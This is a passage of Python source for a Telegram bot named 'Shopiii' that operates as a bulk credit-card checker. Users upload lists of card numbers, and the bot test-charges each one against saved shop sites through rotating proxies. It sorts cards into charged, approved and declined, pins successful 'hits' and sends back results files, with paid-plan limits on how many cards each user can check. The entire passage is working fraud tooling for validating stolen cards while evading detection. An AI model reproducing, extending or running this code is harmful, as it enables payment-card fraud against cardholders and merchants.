    text = f"{PE} <b>Your Saved Sites</b> ({len(sites)})\n━━━━━━━━━━━━━━━━━\n"
    emoji_ids = [CE["link"]]
    
    for idx, site in enumerate(sites[:50], 1):
        text += f"{PE} <code>{idx}.</code> {site}\n"
        emoji_ids.append(CE["globe"])
    
    if len(sites) > 50:
        text += f"\n<i>...and {len(sites) - 50} more</i>"
    
    await styled_reply(event, text, emoji_ids=emoji_ids)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]site$'))
async def check_sites_cmd(event):
    if await check_maintenance(event):
        return
    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites in your DB. Use <code>/add</code> to add.", emoji_ids=[CE["warn"]])
    
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} <b>PROXY REQUIRED</b>\n\nAdd a proxy with <code>/addpxy</code>", emoji_ids=[CE["warn"]])
    
    proxy_urls = [p['proxy_url'] for p in proxies]
    
    status_msg = await styled_reply(event, f"{PE} Checking {len(sites)} sites...", emoji_ids=[CE["globe"]])
    
    alive_sites = []
    dead_sites = []
    batch_size = 10
    
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            tasks = [test_site(site, random.choice(proxy_urls)) for site in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])
            
            await styled_edit(
                status_msg,
                f"{PE} <b>Checking sites...</b>\n━━━━━━━━━━━━━━━━━\n"
                f"{PE} Checked ━ {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                f"{PE} Alive ━ {len(alive_sites)}\n"
                f"{PE} Dead ━ {len(dead_sites)}",
                emoji_ids=[CE["globe"], CE["chart"], CE["check"], CE["cross"]]
            )
        
        for site in dead_sites:
            await remove_site_db(event.sender_id, site)
        
        summary = f"""{PE} <b>Site Check Complete</b>
━━━━━━━━━━━━━━━━━
{PE} Total Sites ━ {len(sites)}
{PE} Alive ━ {len(alive_sites)}
{PE} Dead (Removed) ━ {len(dead_sites)}
━━━━━━━━━━━━━━━━━"""
        
        await styled_edit(status_msg, summary,
                          emoji_ids=[CE["check"], CE["chart"], CE["globe"], CE["trash"]])
    except Exception as e:
        await styled_edit(status_msg, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

# PROXY MANAGEMENT COMMANDS
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    if await check_maintenance(event):
        return
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    try:
        proxy_lines = []
        
        if event.is_reply:
            reply_msg = await event.get_reply_message()
            if reply_msg.file:
                file_path = await reply_msg.download_media()
                try:
                    async with aiofiles.open(file_path, "r", encoding="utf-8") as f:
                        proxy_lines = [line.strip() for line in (await f.read()).splitlines() if line.strip()]
                finally:
                    try:
                        os.remove(file_path)
                    except:
                        pass
            elif reply_msg.text:
                proxy_lines = [line.strip() for line in reply_msg.text.splitlines() if line.strip()]
        else:
            parts = event.raw_text.split(maxsplit=1)
            if len(parts) == 2:
                proxy_lines = [line.strip() for line in parts[1].splitlines() if line.strip()]
            else:
                return await styled_reply(
                    event,
                    f"{PE} <b>Usage:</b>\n<code>/addpxy ip:port:user:pass</code>\n\n"
                    f"Or reply to a .txt file with proxies",
                    emoji_ids=[CE["warn"]]
                )
        
        if not proxy_lines:
            return await styled_reply(event, f"{PE} No proxies provided", emoji_ids=[CE["cross"]])
        
        await ensure_user(event.sender_id)
        current_count = await get_proxy_count(event.sender_id)
        
        if current_count >= 100:
            return await styled_reply(event, f"{PE} Proxy limit reached (100/100)", emoji_ids=[CE["cross"]])
        
        existing_proxies = await get_all_user_proxies(event.sender_id)
        existing_urls = {p['proxy_url'] for p in existing_proxies}
        
        parsed_proxies = []
        invalid_lines = []
        duplicate_lines = []
        
        for line in proxy_lines:
            proxy_data = parse_proxy_format(line)
            if not proxy_data:
                invalid_lines.append(line)
                continue
            if proxy_data['proxy_url'] in existing_urls:
                duplicate_lines.append(line)
                continue
            parsed_proxies.append(proxy_data)
            existing_urls.add(proxy_data['proxy_url'])
        
        if not parsed_proxies and not duplicate_lines:
            return await styled_reply(event, f"{PE} No valid proxies found", emoji_ids=[CE["cross"]])
        
        slots_available = 100 - current_count
        if len(parsed_proxies) > slots_available:
            parsed_proxies = parsed_proxies[:slots_available]
        
        testing_msg = await styled_reply(event, f"{PE} Testing {len(parsed_proxies)} proxy(ies)...", emoji_ids=[CE["shield"]])
        
        added = []
        failed = []
        
        for i, proxy_data in enumerate(parsed_proxies, 1):
            display = f"{proxy_data['ip']}:{proxy_data['port']}"
            
            if len(parsed_proxies) > 1:
                try:
                    await styled_edit(
                        testing_msg,
                        f"{PE} Testing proxy {i}/{len(parsed_proxies)}\n"
                        f"━━━━━━━━━━━━━━━━━\n"
                        f"{PE} Current ━ {display}\n"
                        f"{PE} Added ━ {len(added)}\n"
                        f"{PE} Failed ━ {len(failed)}",
                        emoji_ids=[CE["shield"], CE["link"], CE["check"], CE["cross"]]
                    )
                except:
                    pass
            
            is_working, result = await test_proxy(proxy_data['proxy_url'])
            
            if is_working:
                await add_proxy_db(event.sender_id, proxy_data)
                added.append({'proxy': proxy_data, 'ip': result, 'display': display})
            else:
                failed.append({'proxy': proxy_data, 'error': result, 'display': display})
        
        new_count = current_count + len(added)
        
        result_text = f"{PE} <b>Proxy Import Results</b>\n━━━━━━━━━━━━━━━━━\n"
        emoji_ids = [CE["shield"]]
        
        if added:
            result_text += f"\n{PE} <b>Added ({len(added)}):</b>\n"
            emoji_ids.append(CE["check"])
            for p in added[:10]:
                result_text += f"{PE} <code>{p['display']}</code>\n"
                emoji_ids.append(CE["link"])
        
        if failed:
            result_text += f"\n{PE} <b>Failed ({len(failed)}):</b>\n"
            emoji_ids.append(CE["cross"])
            for f in failed[:5]:
                result_text += f"{PE} <code>{f['display']}</code>\n"
                emoji_ids.append(CE["warn"])
        
        result_text += f"\n━━━━━━━━━━━━━━━━━\n{PE} Total ━ <code>{new_count}/100</code>"
        emoji_ids.append(CE["chart"])
        
        await styled_edit(testing_msg, result_text, emoji_ids=emoji_ids)
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    if await check_maintenance(event):
        return
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    proxies = await get_all_user_proxies(event.sender_id)
    
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies saved.\nUse <code>/addpxy</code> to add.", emoji_ids=[CE["cross"]])
    
    text = f"{PE} <b>Your Proxies</b> ({len(proxies)}/100)\n━━━━━━━━━━━━━━━━━\n"
    emoji_ids = [CE["shield"]]
    
    for idx, p in enumerate(proxies[:30], 1):
        ptype = p.get('type', 'http').upper()
        auth = f" ━ {p['username']}" if p.get('username') else ""
        text += f"{PE} <code>{idx}.</code> {ptype} ━ {p['ip']}:{p['port']}{auth}\n"
        emoji_ids.append(CE["link"])
    
    if len(proxies) > 30:
        text += f"\n<i>...and {len(proxies) - 30} more</i>"
    
    text += f"\n\n━━━━━━━━━━━━━━━━━\n{PE} Use <code>/rmpxy index</code> to remove"
    emoji_ids.append(CE["trash"])
    
    await styled_reply(event, text, emoji_ids=emoji_ids)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    if await check_maintenance(event):
        return
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    try:
        proxies = await get_all_user_proxies(event.sender_id)
        if not proxies:
            return await styled_reply(event, f"{PE} No proxies saved", emoji_ids=[CE["cross"]])
        
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 1:
            return await styled_reply(event, f"{PE} Format: <code>/rmpxy index</code> or <code>/rmpxy all</code>", emoji_ids=[CE["warn"]])
        
        arg = parts[1].strip().lower()
        
        if arg == 'all':
            count = await clear_all_proxies(event.sender_id)
            return await styled_reply(event, f"{PE} Removed all {count} proxies", emoji_ids=[CE["check"]])
        
        try:
            index = int(arg) - 1
            if index < 0 or index >= len(proxies):
                return await styled_reply(event, f"{PE} Invalid index (1-{len(proxies)})", emoji_ids=[CE["cross"]])
            
            removed = await remove_proxy_by_index(event.sender_id, index)
            await styled_reply(
                event,
                f"{PE} <b>Proxy Removed</b>\n━━━━━━━━━━━━━━━━━\n"
                f"{PE} <code>{removed['ip']}:{removed['port']}</code>\n"
                f"{PE} Remaining ━ {len(proxies) - 1}",
                emoji_ids=[CE["check"], CE["trash"], CE["chart"]]
            )
        except ValueError:
            await styled_reply(event, f"{PE} Invalid index", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def check_proxies_cmd(event):
    if await check_maintenance(event):
        return
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies saved", emoji_ids=[CE["cross"]])
    
    status_msg = await styled_reply(event, f"{PE} Testing {len(proxies)} proxies...", emoji_ids=[CE["shield"]])
    
    tasks = [test_proxy(p['proxy_url']) for p in proxies]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    working = []
    dead = []
    
    for idx, (proxy, res) in enumerate(zip(proxies, results), 1):
        display = f"{proxy['ip']}:{proxy['port']}"
        if isinstance(res, tuple) and res[0]:
            working.append(f"{PE} <code>{idx}.</code> {display}")
        else:
            dead.append(f"{PE} <code>{idx}.</code> {display}")
    
    text = f"{PE} <b>Proxy Check Complete</b>\n━━━━━━━━━━━━━━━━━\n"
    emoji_ids = [CE["shield"]]
    
    if working:
        text += f"\n<b>Working ({len(working)}):</b>\n" + "\n".join(working[:20]) + "\n"
        emoji_ids.extend([CE["check"]] + [CE["tick"]] * min(len(working), 20))
    if dead:
        text += f"\n<b>Dead ({len(dead)}):</b>\n" + "\n".join(dead[:10]) + "\n"
        emoji_ids.extend([CE["cross"]] + [CE["warn"]] * min(len(dead), 10))
    
    text += f"\n━━━━━━━━━━━━━━━━━\n{PE} {len(working)} working ━ {len(dead)} dead"
    emoji_ids.append(CE["chart"])
    
    await styled_edit(status_msg, text, emoji_ids=emoji_ids)

# SINGLE CC CHECK
@client.on(events.NewMessage(pattern=r'(?i)^[/.]cc\b'))
async def single_cc_check(event):
    if await check_maintenance(event):
        return
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    await ensure_user(event.sender_id)
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"
    
    sites = await get_user_sites(event.sender_id)
    proxies = await get_all_user_proxies(event.sender_id)
    
    if not sites:
        return await styled_reply(event, f"{PE} No sites! Use <code>/add</code> first.", emoji_ids=[CE["warn"]])
    if not proxies:
        return await styled_reply(event, f"{PE} <b>PROXY REQUIRED</b>\n\nAdd one with <code>/addpxy</code>", emoji_ids=[CE["warn"]])
    
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            cards = extract_cc(replied.text)
            if cards:
                card = cards[0]
    
    if not card:
        text = event.message.text
        cards = extract_cc(text)
        if cards:
            card = cards[0]
    
    if not card:
        return await styled_reply(
            event,
            f"{PE} <b>Usage:</b>\n<code>/cc 4111111111111111|12|2025|123</code>",
            emoji_ids=[CE["warn"]]
        )
    
    proxies_formatted = [format_proxy_for_api(p) for p in proxies]
    
    status_msg = await styled_reply(
        event,
        f"{PE} <b>Checking...</b>\n━━━━━━━━━━━━━━━━━\n"
        f"{PE} Card ━ <code>{card}</code>",
        emoji_ids=[CE["bolt"], CE["search"]]
    )
    
    start_time = time.time()
    
    try:
        result = await check_card_with_retry(card, sites, proxies_formatted, max_retries=3)
        elapsed = round(time.time() - start_time, 2)
        
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        
        status = result['status']
        if status == 'Charged':
            status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
            header_emojis = [CE["gem"], CE["gem"]]
        elif status == 'Approved':
            status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
            header_emojis = [CE["check"], CE["check"]]
        else:
            status_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
            header_emojis = [CE["cross"], CE["cross"]]
        
        msg = f"""{PE} <b>𝒮𝒽𝑜𝓅𝒾𝒾𝒾</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} Status ━ <b>{status_text}</b>
{PE} Card ━ <code>{result['card']}</code>
{PE} Response ━ {result['message'][:150]}
{PE} Gateway ━ {result.get('gateway', 'Unknown')}
{PE} Price ━ {result.get('price', '-')}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>
━━━━━━━━━━━━━━━━━
{PE} Time ━ <code>{elapsed}s</code>"""
        
        emoji_ids = [CE["fire"], CE["fire"], CE["star"]] + header_emojis + [
            CE["info"], CE["bolt"], CE["globe"], CE["gem"], CE["chart"]
        ]
        
        await styled_edit(status_msg, msg, emoji_ids=emoji_ids)
        
        if status == "Charged":
            await pin_charged_message(event, status_msg)
            if event.chat.id == event.sender_id:
                await send_realtime_hit(event.sender_id, result, "Charged", username)
    except Exception as e:
        await styled_edit(status_msg, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

# MASS CC CHECK (/chk)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]chk$'))
async def mass_check_cmd(event):
    if await check_maintenance(event):
        return
    can_access, access_type, plan = await get_user_access(event)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    cc_limit = get_cc_limit(plan, event.sender_id)
    user_id = event.sender_id
    
    if user_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"{PE} Already processing", emoji_ids=[CE["warn"]])
    
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to a .txt file with /chk", emoji_ids=[CE["warn"]])
    
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to a .txt file", emoji_ids=[CE["warn"]])
    
    sites = await get_user_sites(user_id)
    proxies = await get_all_user_proxies(user_id)
    
    if not sites:
        return await styled_reply(event, f"{PE} No sites! Use <code>/add</code>", emoji_ids=[CE["warn"]])
    if not proxies:
        return await styled_reply(event, f"{PE} <b>PROXY REQUIRED</b>\n\nAdd with <code>/addpxy</code>", emoji_ids=[CE["warn"]])
    
    file_path = await replied.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
    except Exception as e:
        try:
            os.remove(file_path)
        except:
            pass
        return await styled_reply(event, f"{PE} Error reading file: {e}", emoji_ids=[CE["cross"]])
    
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards found", emoji_ids=[CE["cross"]])
    
    total_found = len(cards)
    if len(cards) > cc_limit:
        cards = cards[:cc_limit]
        await styled_reply(
            event,
            f"{PE} Found {total_found} CCs\n"
            f"{PE} Limit ━ {cc_limit}\n"
            f"{PE} Checking ━ {len(cards)} CCs",
            emoji_ids=[CE["chart"], CE["star"], CE["check"]]
        )
    else:
        await styled_reply(
            event,
            f"{PE} Found {len(cards)} valid CCs\n"
            f"{PE} Starting check...",
            emoji_ids=[CE["chart"], CE["bolt"]]
        )
    
    kb = [
        [pbtn("✅ Charged + Approved", f"chk_pref:yes:{user_id}")],
        [pbtn("❌ Only Charged", f"chk_pref:no:{user_id}")]
    ]
    
    pref_msg = await styled_reply(
        event,
        f"{PE} <b>FILTER MODE</b>\n━━━━━━━━━━━━━━━━━\n"
        f"<i>✅ Yes: Charged + Approved</i>\n"
        f"<i>❌ No: Only Charged</i>",
        kb,
        emoji_ids=[CE["chart"], CE["gem"]]
    )
    
    USER_APPROVED_PREF[f"chk_{user_id}"] = {
        "cards": cards,
        "sites": sites,
        "proxies": [format_proxy_for_api(p) for p in proxies],
        "event": event,
        "pref_msg": pref_msg
    }

@client.on(events.CallbackQuery(pattern=rb"chk_pref:(yes|no):(\d+)"))
async def chk_pref_callback(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    user_id = int(match.group(2).decode())
    
    if event.sender_id != user_id:
        return await event.answer("Not your session!", alert=True)
    
    key = f"chk_{user_id}"
    data = USER_APPROVED_PREF.pop(key, None)
    if not data:
        return await event.answer("Session expired!", alert=True)
    
    send_approved = (pref == "yes")
    
    try:
        await data["pref_msg"].delete()
    except:
        pass
    
    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.answer("Already running!", alert=True)
    
    ACTIVE_MTXT_PROCESSES[user_id] = True
    await event.answer("Starting check...")
    asyncio.create_task(process_mass_cards(data["event"], data["cards"], data["sites"],
                                            data["proxies"], send_approved))

async def process_mass_cards(event, cards, sites, proxies, send_approved=True):
    user_id = event.sender_id
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    total = len(cards)
    results = {
        'charged': [], 'approved': [], 'declined': [], 'errors': [],
        'total': total, 'checked': 0,
        'start_time': time.time()
    }
    
    is_private = event.chat.id == user_id
    mode_text = "Charged + Approved" if send_approved else "Only Charged"
    
    status_msg = await styled_reply(
        event,
        f"{PE} <b>Processing {total} cards</b>\n━━━━━━━━━━━━━━━━━\n"
        f"{PE} Mode ━ {mode_text}",
        emoji_ids=[CE["bolt"], CE["chart"]]
    )
    
    last_update = [time.time()]
    last_card_display = ["-"]
    
    async def update_progress():
        if user_id not in ACTIVE_MTXT_PROCESSES:
            return
        elapsed = int(time.time() - results['start_time'])
        h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
        
        kb = [
            [pbtn(f"💳 {last_card_display[0]}", "none")],
            [pbtn(f"💰 Charged: {len(results['charged'])}", "none"),
             pbtn(f"✅ Approved: {len(results['approved'])}", "none")],
            [pbtn(f"❌ Declined: {len(results['declined'])}", "none"),
             pbtn(f"⚠️ Errors: {len(results['errors'])}", "none")],
            [pbtn(f"📊 {results['checked']}/{total}", "none")],
            [pbtn("🛑 Stop", f"stop_chk:{user_id}")]
        ]
        
        text = f"""{PE} <b>𝒮𝒽𝑜𝓅𝒾𝒾𝒾 ━ Processing</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}
{PE} Checked ━ {results['checked']}/{total}
{PE} Time ━ {h}h {m}m {s}s
━━━━━━━━━━━━━━━━━"""
        
        try:
            await styled_edit(status_msg, text, buttons=kb,
                              emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["bolt"], CE["star"]])
        except:
            pass
    
    queue = asyncio.Queue()
    for card in cards:
        queue.put_nowait(card)
    
    async def worker():
        while not queue.empty() and user_id in ACTIVE_MTXT_PROCESSES:
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            
            current_sites = await get_user_sites(user_id)
            current_proxies_data = await get_all_user_proxies(user_id)
            
            if not current_sites or not current_proxies_data:
                break
            
            current_proxies = [format_proxy_for_api(p) for p in current_proxies_data]
            
            res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=2)
            results['checked'] += 1
            last_card_display[0] = f"{card[:12]}****"
            
            status = res['status']
            
            if status == 'Charged':
                results['charged'].append(res)
                await send_realtime_hit(user_id, res, "Charged", username)
                await send_card_result(event, res, status, is_private)
            elif status == 'Approved':
                results['approved'].append(res)
                if send_approved:
                    await send_realtime_hit(user_id, res, "Approved", username)
                    await send_card_result(event, res, status, is_private)
            elif status == 'Site Error' or status == 'Error':
                results['errors'].append(res)
            else:
                results['declined'].append(res)
            
            queue.task_done()
            
            now = time.time()
            if now - last_update[0] >= 2.0:
                last_update[0] = now
                await update_progress()
    
    try:
        workers = [asyncio.create_task(worker()) for _ in range(10)]
        
        while workers:
            if user_id not in ACTIVE_MTXT_PROCESSES:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        
        await update_progress()
        await asyncio.sleep(1)
        
        elapsed = int(time.time() - results['start_time'])
        h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
        
        final_text = f"""{PE} <b>𝒮𝒽𝑜𝓅𝒾𝒾𝒾 ━ Complete</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}
{PE} Charged ━ {len(results['charged'])}
{PE} Approved ━ {len(results['approved'])}
{PE} Declined ━ {len(results['declined'])}
{PE} Errors ━ {len(results['errors'])}
━━━━━━━━━━━━━━━━━
{PE} Time ━ {h}h {m}m {s}s"""
        
        emoji_ids = [CE["party"], CE["party"], CE["chart"], CE["gem"],
                     CE["check"], CE["cross"], CE["warn"], CE["bolt"]]
        
        try:
            await status_msg.delete()
        except:
            pass
        
        await styled_send(event.chat_id, final_text, emoji_ids=emoji_ids)
        await send_final_file(user_id, results, event)
    
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)

async def send_card_result(event, result, status, is_private):
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        
        if status == 'Charged':
            status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
            header_emojis = [CE["gem"], CE["gem"]]
        else:
            status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
            header_emojis = [CE["check"], CE["check"]]
        
        msg = f"""{PE} <b>𝒮𝒽𝑜𝓅𝒾𝒾𝒾</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} Status ━ <b>{status_text}</b>
{PE} Card ━ <code>{result['card']}</code>
{PE} Response ━ {result['message'][:150]}
{PE} Gateway ━ {result.get('gateway', 'Unknown')}
{PE} Price ━ {result.get('price', '-')}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
        
        emoji_ids = [CE["fire"], CE["fire"], CE["star"]] + header_emojis + [
            CE["info"], CE["bolt"], CE["globe"], CE["gem"]
        ]
        
        result_msg = await styled_reply(event, msg, emoji_ids=emoji_ids)
        
        if status == "Charged":
            await pin_charged_message(event, result_msg)
    except Exception as e:
        print(f"Error sending card result: {e}")

async def send_final_file(user_id, results, event):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_results_{user_id}_{timestamp}.txt"
    
    try:
        async with aiofiles.open(filename, 'w') as f:
            await f.write("=" * 70 + "\n")
            await f.write("⚡ SHOPIII CHECKER RESULTS ⚡\n")
            await f.write("=" * 70 + "\n\n")
            
            await f.write(f"💎 CHARGED ({len(results['charged'])}):\n")
            await f.write("-" * 70 + "\n")
            for r in results['charged']:
                await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | "
                              f"{r.get('price', '-')} | {r['message'][:100]}\n")
            
            await f.write(f"\n✅ APPROVED ({len(results['approved'])}):\n")
            await f.write("-" * 70 + "\n")
            for r in results['approved']:
                await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | "
                              f"{r.get('price', '-')} | {r['message'][:100]}\n")
        
        await styled_send(
            event.chat_id,
            f"{PE} <b>Results File</b>",
            emoji_ids=[CE["chart"]],
            file=filename
        )
        
        try:
            os.remove(filename)
        except:
            pass
    except Exception as e:
        print(f"Error creating result file: {e}")

# RAN COMMAND (sites.txt checker)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran$'))
async def ran_check_cmd(event):
    if await check_maintenance(event):
        return
    can_access, access_type, plan = await get_user_access(event)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)

    cc_limit = get_cc_limit(plan, event.sender_id)
    user_id = event.sender_id

    if user_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"{PE} Already processing", emoji_ids=[CE["warn"]])

    sites_file = "sites.txt"
    if not os.path.exists(sites_file):
        return await styled_reply(
            event,
            f"{PE} <b>File not found</b>\n━━━━━━━━━━━━━━━━━\n"
            f"'{sites_file}' is missing.\nPlease create it with one domain per line.",
            emoji_ids=[CE["cross"]]
        )

    try:
        async with aiofiles.open(sites_file, "r", encoding="utf-8") as f:
            content = await f.read()
        raw_lines = [line.strip() for line in content.splitlines() if line.strip()]
        sites = [line for line in raw_lines if is_valid_url_or_domain(line)]
        if not sites:
            return await styled_reply(event, f"{PE} No valid domains found in sites.txt", emoji_ids=[CE["cross"]])
        sites = list(dict.fromkeys(sites))
    except Exception as e:
        return await styled_reply(event, f"{PE} Error reading sites.txt: {e}", emoji_ids=[CE["cross"]])

    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to a .txt file with cards", emoji_ids=[CE["warn"]])

    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to a .txt file", emoji_ids=[CE["warn"]])

    proxies = await get_all_user_proxies(user_id)
    if not proxies:
        return await styled_reply(
            event,
            f"{PE} <b>PROXY REQUIRED</b>\n\nAdd a proxy with <code>/addpxy</code> first.",
            emoji_ids=[CE["warn"]]
        )

    file_path = await replied.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
    except Exception as e:
        try:
            os.remove(file_path)
        except:
            pass
        return await styled_reply(event, f"{PE} Error reading file: {e}", emoji_ids=[CE["cross"]])

    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards found", emoji_ids=[CE["cross"]])

    total_found = len(cards)
    if len(cards) > cc_limit:
        cards = cards[:cc_limit]
        await styled_reply(
            event,
            f"{PE} Found {total_found} CCs\n"
            f"{PE} Limit ━ {cc_limit}\n"
            f"{PE} Checking ━ {len(cards)} CCs\n"
            f"{PE} Using sites from sites.txt ━ {len(sites)} sites",
            emoji_ids=[CE["chart"], CE["star"], CE["check"], CE["globe"]]
        )
    else:
        await styled_reply(
            event,
            f"{PE} Found {len(cards)} CCs\n"
            f"{PE} Using sites from sites.txt ━ {len(sites)} sites\n"
            f"{PE} Starting check...",
            emoji_ids=[CE["chart"], CE["globe"], CE["bolt"]]
        )

    kb = [
        [pbtn("✅ Charged + Approved", f"ran_pref:yes:{user_id}")],
        [pbtn("❌ Only Charged", f"ran_pref:no:{user_id}")]
    ]

    pref_msg = await styled_reply(
        event,
        f"{PE} <b>FILTER MODE</b>\n━━━━━━━━━━━━━━━━━\n"
        f"<i>✅ Yes: Charged + Approved</i>\n"
        f"<i>❌ No: Only Charged</i>",
        kb,
        emoji_ids=[CE["chart"], CE["gem"]]
    )

    USER_APPROVED_PREF[f"ran_{user_id}"] = {
        "cards": cards,
        "sites": sites,
        "proxies": [format_proxy_for_api(p) for p in proxies],
        "event": event,
        "pref_msg": pref_msg
    }

@client.on(events.CallbackQuery(pattern=rb"ran_pref:(yes|no):(\d+)"))
async def ran_pref_callback(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        return await event.answer("Not your session!", alert=True)

    key = f"ran_{user_id}"
    data = USER_APPROVED_PREF.pop(key, None)
    if not data:
        return await event.answer("Session expired!", alert=True)

    send_approved = (pref == "yes")

    try:
        await data["pref_msg"].delete()
    except:
        pass

    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.answer("Already running!", alert=True)

    ACTIVE_MTXT_PROCESSES[user_id] = True
    await event.answer("Starting check...")
    asyncio.create_task(process_mass_cards_with_sites(
        data["event"], data["cards"], data["sites"],
        data["proxies"], send_approved
    ))

async def process_mass_cards_with_sites(event, cards, sites, proxies, send_approved=True):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    total = len(cards)
    results = {
        'charged': [], 'approved': [], 'declined': [], 'errors': [],
        'total': total, 'checked': 0,
        'start_time': time.time()
    }

    is_private = event.chat.id == user_id
    mode_text = "Charged + Approved" if send_approved else "Only Charged"

    status_msg = await styled_reply(
        event,
        f"{PE} <b>Processing {total} cards</b>\n━━━━━━━━━━━━━━━━━\n"
        f"{PE} Mode ━ {mode_text}\n"
        f"{PE} Sites ━ from sites.txt ({len(sites)})",
        emoji_ids=[CE["bolt"], CE["chart"], CE["globe"]]
    )

    last_update = [time.time()]
    last_card_display = ["-"]

    async def update_progress():
        if user_id not in ACTIVE_MTXT_PROCESSES:
            return
        elapsed = int(time.time() - results['start_time'])
